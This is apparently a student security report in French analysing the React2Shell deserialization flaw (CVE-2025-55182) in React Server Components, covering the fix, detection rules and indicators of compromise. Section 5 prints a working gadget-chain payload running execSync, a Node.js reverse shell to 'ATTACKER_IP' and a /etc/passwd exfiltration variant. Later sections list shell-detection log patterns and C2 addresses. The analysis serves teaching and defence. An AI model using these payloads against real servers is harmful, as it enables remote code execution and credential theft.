# CVE-2025-55182 (React2Shell) - Rapport d'Analyse Technique

## Résumé Exécutif

La CVE-2025-55182, surnommée "React2Shell", est une vulnérabilité critique affectant les composants serveur React (RSC) avec un score CVSS maximal de 10.0. La vulnérabilité permet une exécution de code à distance non authentifiée via une désérialisation non sécurisée des payloads du protocole "Flight" des RSC. Divulguée pour la première fois le 3 décembre 2025, elle a été rapidement militarisée par plusieurs acteurs malveillants, y compris des groupes APT liés à la Chine, dans les heures suivant la divulgation publique.

---

## Table des Matières

1. [Aperçu de la Vulnérabilité](#1-aperçu-de-la-vulnérabilité)
2. [Composants Affectés](#2-composants-affectés)
3. [Analyse Technique Approfondie](#3-analyse-technique-approfondie)
4. [Flux d'Exploitation](#4-flux-dexploitation)
5. [Construction du Payload](#5-construction-du-payload)
6. [Analyse d'Impact](#6-analyse-dimpact)
7. [Analyse du Correctif](#7-analyse-du-correctif)
8. [Principes de Codage Sécurisé](#8-principes-de-codage-sécurisé)
9. [Méthodes de Détection](#9-méthodes-de-détection)
10. [Indicateurs de Compromission](#10-indicateurs-de-compromission)

---

## 1. Aperçu de la Vulnérabilité

### 1.1 Classification

| Attribut | Valeur |
|-----------|-------|
| **ID CVE** | CVE-2025-55182 |
| **CWE** | CWE-502 : Désérialisation de données non fiables |
| **CVSS v3.1** | 10.0 (Critique) |
| **CVSS v4.0** | 9.3 (Critique) |
| **Vecteur d'attaque** | Réseau |
| **Complexité de l'attaque** | Faible |
| **Privilèges requis** | Aucun |
| **Interaction utilisateur** | Aucune |
| **Portée** | Modifiée |
| **Impact Confidentialité** | Élevé |
| **Impact Intégrité** | Élevé |
| **Impact Disponibilité** | Élevé |

### 1.2 Chronologie

| Date | Événement |
|------|-------|
| 29 Novembre 2025 | Lachlan Davidson divulgue à l'équipe Meta/React |
| 3 Décembre 2025 | Divulgation publique et sortie du correctif |
| 3 Décembre 2025 | Premières tentatives d'exploitation observées (en quelques heures) |
| 4 Décembre 2025 | PoC fonctionnel publié par Moritz Sanft |
| 5 Décembre 2025 | PoCs originaux publiés par Lachlan Davidson |
| 5 Décembre 2025+ | Début des campagnes d'exploitation de masse |
| 9 Décembre 2025 | CISA ajoute à la liste des vulnérabilités exploitées connues (KEV) |

---

## 2. Composants Affectés

### 2.1 Paquets Vulnérables

La vulnérabilité réside dans les paquets serveur React suivants :

```
react-server-dom-webpack: 19.0.0, 19.1.0, 19.1.1, 19.2.0
react-server-dom-parcel:  19.0.0, 19.1.0, 19.1.1, 19.2.0
react-server-dom-turbopack: 19.0.0, 19.1.0, 19.1.1, 19.2.0
```

### 2.2 Frameworks Affectés

| Framework | Versions Vulnérables | Notes |
|-----------|-------------------|-------|
| Next.js | 15.0.0 - 16.0.6 (App Router) | Le plus largement exploité |
| React Router | Implémentations RSC | Moins courant |
| Waku | Implémentations RSC | Confirmé vulnérable |
| Vite (Plugin RSC) | Implémentations RSC | Confirmé vulnérable |
| RedwoodSDK | Implémentations RSC | Potentiellement affecté |

### 2.3 Détail Critique

**Les applications sont vulnérables même si elles ne définissent pas explicitement de Fonctions Serveur**, tant qu'elles supportent les Composants Serveur React. La simple présence de l'App Router dans Next.js expose le point de terminaison vulnérable.

---

## 3. Analyse Technique Approfondie

### 3.1 Architecture des Composants Serveur React

Les Composants Serveur React (RSC) introduits dans React 19 permettent aux composants de s'exécuter sur le serveur avant d'être streamés vers le client. La communication utilise le protocole "Flight" - un format de sérialisation qui encode :

- Arbres de composants
- Références paresseuses (Lazy references)
- Références de modules
- Promesses et données asynchrones

### 3.2 Le Protocole Flight

Le protocole Flight utilise des préfixes spéciaux pour encoder différents types :

| Préfixe | Type | Description |
|--------|------|-------------|
| `$` | Référence | Référence d'autres morceaux (chunks) |
| `$@` | Promesse | Valeur asynchrone/paresseuse |
| `$B` | Buffer | Données binaires (encodées en hexa) |
| `$Q` | Map/Set | Types de collection |
| `$1:` | Référence de Module | Recherche de module serveur |

### 3.3 Cause Racine : Désérialisation Non Sécurisée

La vulnérabilité existe dans la façon dont le serveur React désérialise les payloads Flight entrants. Les problèmes clés sont :

1. **Traversée de la Chaîne de Prototypes** : Le désérialiseur utilise la notation par crochets pour accéder aux propriétés sans valider la structure :
   ```javascript
   moduleExports[metadata[2]]  // Traverse la chaîne de prototypes
   ```

2. **Pas de Validation de Type** : Les objets sont traités sans vérifier qu'ils correspondent aux formes attendues.

3. **Gadgets Auto-Référentiels** : Les attaquants peuvent créer des payloads qui se réfèrent à eux-mêmes pour construire des chaînes d'exécution.

### 3.4 Le Chemin de Code Vulnérable

Le flux vulnérable dans `react-server-dom-webpack` :

```javascript
// Modèle vulnérable simplifié
function resolveModuleReference(response, id, model) {
    // L'attaquant contrôle la structure 'model'
    const moduleExports = response._formData.get(response._prefix + id);
    // Quand _formData.get est le constructeur Function...
    // Et que _prefix contient du code malveillant...
    // Cela devient : Function("code malveillant")()
}
```

---

## 4. Flux d'Exploitation

### 4.1 Prérequis de l'Attaque

1. La cible exécute une version vulnérable de React/Next.js
2. L'application utilise les Composants Serveur React (par défaut dans Next.js App Router)
3. Le point de terminaison RSC est accessible via le réseau

### 4.2 Chaîne d'Exploitation

```
┌──────────────────────────────────────────────────────────────────┐
│  ATTAQUANT                                                       │
│                                                                  │
│  1. Crée un payload multipart/form-data malveillant              │
│  2. Inclut l'en-tête Next-Action pour déclencher le traitement RSC │
│  3. Envoie une requête POST à n'importe quel point de terminaison │
└───────────────────────────┬──────────────────────────────────────┘
                            │
                            ▼
┌──────────────────────────────────────────────────────────────────┐
│  SERVEUR VULNÉRABLE (Next.js/React)                              │
│                                                                  │
│  4. Le serveur reçoit la requête avec l'en-tête Next-Action      │
│  5. Le décodeur RSC Flight commence à traiter les données multipart │
│  6. Le désérialiseur rencontre une structure de chunk malveillante │
│  7. La traversée de la chaîne de proto atteint le constructeur Function │
│  8. La chaîne de code contrôlée par l'attaquant est passée à Function() │
│  9. La fonction s'exécute avec les privilèges du serveur         │
└───────────────────────────┬──────────────────────────────────────┘
                            │
                            ▼
┌──────────────────────────────────────────────────────────────────┐
│  RÉSULTAT : EXÉCUTION DE CODE À DISTANCE                         │
│                                                                  │
│  - Exécution de commande (child_process.execSync)                │
│  - Accès au système de fichiers                                  │
│  - Accès réseau pour mouvement latéral                           │
│  - Accès aux métadonnées cloud pour vol d'identifiants           │
└──────────────────────────────────────────────────────────────────┘
```

### 4.3 Pourquoi l'En-tête `Next-Action` ?

L'en-tête `Next-Action` déclenche le traitement des Server Actions dans Next.js. Lorsqu'il est présent :
- Le corps de la requête est analysé comme des données RSC Flight
- Le chemin de désérialisation vulnérable est invoqué
- **Aucune Server Action réelle n'a besoin d'être définie** - l'analyseur s'active indépendamment

---

## 5. Construction du Payload

### 5.1 Chaîne de Gadgets Principale

L'exploit construit une "chaîne de gadgets" - une série d'objets qui, lorsqu'ils sont désérialisés, permettent l'exécution de code :

```javascript
const payload = {
    '0': '$1',  // Point d'entrée - référence le chunk 1
    '1': {
        'then': '$2:then',           // Thenable - est attendu (awaited)
        'status': 'resolved_model',   // Déclenche la résolution du modèle
        'reason': 0,
        '_response': '$4',            // Pointe vers notre réponse craftée
        'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
    },
    '2': '$@3',  // Enveloppe de Promesse
    '3': [],     // Tableau vide (son constructeur est Array, Array.constructor est Function)
    '4': {
        '_prefix': 'process.mainModule.require("child_process").execSync("id");',
        '_formData': {
            'get': '$3:constructor:constructor'  // Array -> Array.constructor -> Function
        },
        '_chunks': '$2:_response:_chunks'
    }
}
```

### 5.2 Explication des Gadgets

| Chunk | Objectif |
|-------|---------|
| `0` | Point d'entrée, commence la chaîne de résolution |
| `1` | Faux objet "Chunk" avec `.then` pour la gestion des Promesses |
| `2` | Enveloppe de Promesse (préfixe `$@`) qui déclenche l'attente (await) |
| `3` | Tableau vide - utilisé pour accéder à `Function` via prototype |
| `4` | Faux objet "Response" avec `_prefix` malveillant et chaîne de gadgets |

### 5.3 Séquence d'Exécution

1. L'analyseur résout `'0': '$1'` → charge le Chunk 1
2. `_response` du Chunk 1 référence le Chunk 4
3. `_formData.get` du Chunk 4 = `$3:constructor:constructor` :
   - `$3` = tableau vide `[]`
   - `[].constructor` = `Array`
   - `Array.constructor` = `Function`
4. Lorsque `.get()` est appelé avec `_prefix` comme argument :
   - `Function("process.mainModule.require('child_process')...")` est invoqué
   - Retourne une fonction appelable contenant le code de l'attaquant
5. La chaîne de Promesse (`.then`) provoque l'appel de la fonction
6. **RCE accompli**

### 5.4 Variations de Payload

**Exécution de Commande Basique :**
```javascript
_prefix: "process.mainModule.require('child_process').execSync('whoami');"
```

**Reverse Shell :**
```javascript
_prefix: `
  const net = require('net');
  const cp = require('child_process');
  const sh = cp.spawn('/bin/sh',[]);
  const client = new net.Socket();
  client.connect(4444, 'ATTACKER_IP', function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
`
```

**Exfiltration de Fichiers :**
```javascript
_prefix: `
  const fs = require('fs');
  const data = fs.readFileSync('/etc/passwd', 'utf8');
  throw new Error(data);  // Exfil via message d'erreur
`
```

---

## 6. Analyse d'Impact

### 6.1 Justification de la Sévérité

Le score CVSS de 10.0 est justifié car :

1. **Non authentifié** : Pas d'identifiants ou de session requis
2. **Distant** : Exploitable via le réseau
3. **Configuration par défaut** : Affecte les déploiements standards
4. **Haute Fiabilité** : Taux de succès proche de 100%
5. **Compromission Totale** : Permet l'exécution de code arbitraire
6. **Changement de Portée** : Peut pivoter vers l'infrastructure cloud

### 6.2 Impact Réel

**Statistiques (en décembre 2025) :**
- 39% des environnements cloud contiennent des instances vulnérables (Wiz)
- 44% des environnements cloud ont Next.js exposé publiquement (Wiz)
- 8.1+ millions de sessions d'attaque observées (GreyNoise)
- 8,163+ IP d'attaquants uniques dans 101 pays (GreyNoise)

### 6.3 Modèles d'Attaque Observés

| Type d'Attaque | Description |
|-------------|-------------|
| **Cryptomining** | Déploiement de XMRig, intégration c3pool |
| **Vol d'Identifiants** | Clés AWS, clés SSH, fichiers .env |
| **Installation de Backdoor** | Sliver, MINOCAT, SNOWLIGHT, HISONIC |
| **Accès aux Métadonnées Cloud** | Scraping de 169.254.169.254 pour les identifiants IAM |
| **Persistance Sans Fichier** | Techniques de monkey-patching Node.js |

### 6.4 Acteurs Malveillants

Exploitation confirmée par :
- Earth Lamia (lié à la Chine)
- Jackpot Panda (lié à la Chine)
- CL-STA-1015 (Broker d'Accès Initial, suspecté PRC MSS)
- Acteurs liés à l'Iran
- Nombreux groupes de cybercriminalité

---

## 7. Analyse du Correctif

### 7.1 La Solution

L'équipe React a corrigé la vulnérabilité en :

1. **Validation des Entrées** : Vérification stricte des types avant désérialisation
2. **Protection de la Chaîne de Prototypes** : Prévention de la traversée via `__proto__`
3. **Application de la Forme des Objets** : Validation de la structure attendue avant traitement

### 7.2 Versions Corrigées

```
react-server-dom-webpack: >= 19.0.1, >= 19.1.2, >= 19.2.1
react-server-dom-parcel:  >= 19.0.1, >= 19.1.2, >= 19.2.1  
react-server-dom-turbopack: >= 19.0.1, >= 19.1.2, >= 19.2.1
next: >= 15.2.4, >= 16.0.7
```

### 7.3 Changements de Code Clés

**Avant (Vulnérable) :**
```javascript
function resolveChunk(chunk) {
    // Pas de validation - fait confiance à la structure d'entrée
    return response._formData.get(response._prefix + chunk);
}
```

**Après (Corrigé) :**
```javascript
function resolveChunk(chunk) {
    // Valide que le chunk est du type attendu
    if (typeof chunk !== 'object' || chunk === null) {
        throw new Error('Invalid chunk type');
    }
    // Empêche la pollution de prototype
    if ('__proto__' in chunk || 'constructor' in chunk) {
        throw new Error('Invalid chunk properties');
    }
    // Validation de forme supplémentaire...
    return response._formData.get(response._prefix + chunk);
}
```

---

## 8. Principes de Codage Sécurisé

### 8.1 Leçons Apprises

| Principe | Application |
|-----------|-------------|
| **Ne Jamais Faire Confiance aux Entrées Utilisateur** | Toutes les données désérialisées doivent être validées |
| **Vérification de Type** | Vérifier les formes d'objets avant traitement |
| **Prévention de Pollution de Prototype** | Bloquer l'accès à `__proto__`, `constructor` |
| **Moindre Privilège** | Exécuter Node.js avec des permissions minimales |
| **Défense en Profondeur** | WAF + Protection à l'exécution + Surveillance |

### 8.2 Recommandations pour les Développeurs

1. **Mettre à Jour Immédiatement** : Pas de contournement - le patch est la seule solution
2. **Auditer les Dépendances** : Vérifier les paquets `react-server-dom-*` vulnérables
3. **Segmentation Réseau** : Limiter les sorties depuis les conteneurs d'application
4. **Protection à l'Exécution** : Déployer une sécurité au niveau applicatif
5. **Surveillance** : Alerter sur le lancement suspect de processus fils (child_process)

### 8.3 Modèles de Désérialisation Sécurisée

```javascript
// BON : Désérialisation sécurisée avec validation de schéma
const { z } = require('zod');

const ChunkSchema = z.object({
    type: z.enum(['text', 'model', 'module']),
    value: z.string(),
    // Propriétés définies explicitement - pas d'accès dynamique
});

function safeDeserialize(input) {
    const result = ChunkSchema.safeParse(input);
    if (!result.success) {
        throw new Error('Invalid chunk format');
    }
    return result.data;
}
```

---

## 9. Méthodes de Détection

### 9.1 Détection Basée sur le Réseau

**Indicateurs de Requête HTTP :**
- En-tête `Next-Action` présent
- `Content-Type: multipart/form-data`
- POST vers n'importe quel point de terminaison avec des modèles de payload RSC

**Règle Snort/Suricata :**
```
alert http any any -> any any (
    msg:"CVE-2025-55182 React2Shell Exploit Attempt";
    flow:to_server,established;
    http.header; content:"Next-Action";
    http.header; content:"multipart/form-data";
    http.request_body; content:"__proto__";
    classtype:web-application-attack;
    sid:2025551820; rev:1;
)
```

### 9.2 Détection Basée sur l'Hôte

**Surveillance des Processus :**
- Node.js lançant des processus shell
- Utilisation inattendue de `child_process`
- Connexions réseau de Node vers des points de terminaison de métadonnées

**Système de Fichiers :**
- Nouveaux fichiers dans `/tmp` ou emplacements inscriptibles
- Services systemd modifiés
- Entrées cron suspectes

### 9.3 Analyse de Logs

**Modèles de Logs Suspects :**
```
# Message d'erreur contenant la sortie de commande (technique d'exfiltration)
Error: uid=0(root) gid=0(root)

# Tentatives d'accès aux métadonnées
curl 169.254.169.254

# Indicateurs de reverse shell
/bin/sh -i
```

---

## 10. Indicateurs de Compromission

### 10.1 IOCs Réseau

| Type | Valeur | Contexte |
|------|-------|---------|
| IP | 37.27.217.205 | Serveur C2 |
| IP | 212.237.120.249 | Serveur C2 |
| IP | 154.26.190.6 | C2 Sliver |
| IP | 144.91.87.221 | Exfiltration de Données |
| Domaine | anywherehost.site | Infrastructure Malware |
| Domaine | inerna1.site | Infrastructure Malware |
| Domaine | keep.camdvr.org | Infrastructure Sliver |

### 10.2 Hashs de Fichiers (SHA1)

| Hash | Description |
|------|-------------|
| `0972859984decfaf9487f9a2c2c7f5d2b03560a0` | Backdoor Sliver |
| `d6e97c9783f0907f1ee9415736816e272a9df060` | Mineur XMRig |
| `91152e6ffe0474b06bb52f41ab3f3545ac360e64` | Voleur d'Identifiants |

### 10.3 Règle YARA

```yara
rule React2Shell_Payload {
    meta:
        description = "Detects React2Shell exploit payload"
        author = "Security Lab"
        date = "2025-12"
        cve = "CVE-2025-55182"
    
    strings:
        $s1 = "__proto__:then" ascii wide
        $s2 = "constructor:constructor" ascii wide
        $s3 = "resolved_model" ascii wide
        $s4 = "_formData" ascii wide
        $s5 = "child_process" ascii wide
        $s6 = "execSync" ascii wide
        
    condition:
        4 of them
}
```

---

## Conclusion

La CVE-2025-55182 représente un cas d'école de désérialisation non sécurisée menant à des conséquences catastrophiques. La combinaison de :

- Adoption massive du framework (React/Next.js)
- Configuration vulnérable par défaut
- Complexité d'exploitation triviale
- Impact de sévérité maximale

...a créé une tempête parfaite que les acteurs malveillants ont rapidement exploitée. Les organisations doivent traiter cela comme une **priorité critique** et appliquer les correctifs immédiatement.

---

## Références

1. Avis de Sécurité React - https://react.dev/security
2. Analyse Approfondie Wiz - https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive
3. Renseignement sur les Menaces AWS - https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/
4. Renseignement sur les Menaces Google - https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182
5. Blog de Sécurité Microsoft - https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/
6. Analyse GreyNoise - https://www.greynoise.io/blog/cve-2025-55182-react2shell-opportunistic-exploitation-in-the-wild
7. Analyse Unit 42 - https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/
8. NVD - https://nvd.nist.gov/vuln/detail/CVE-2025-55182

---

*Rapport pour le Cours de Sécurité des SI  ENSIMAG ISI 2026 | CVE-2025-55182*
*Dernière Mise à Jour : 18 Janvier 2026*
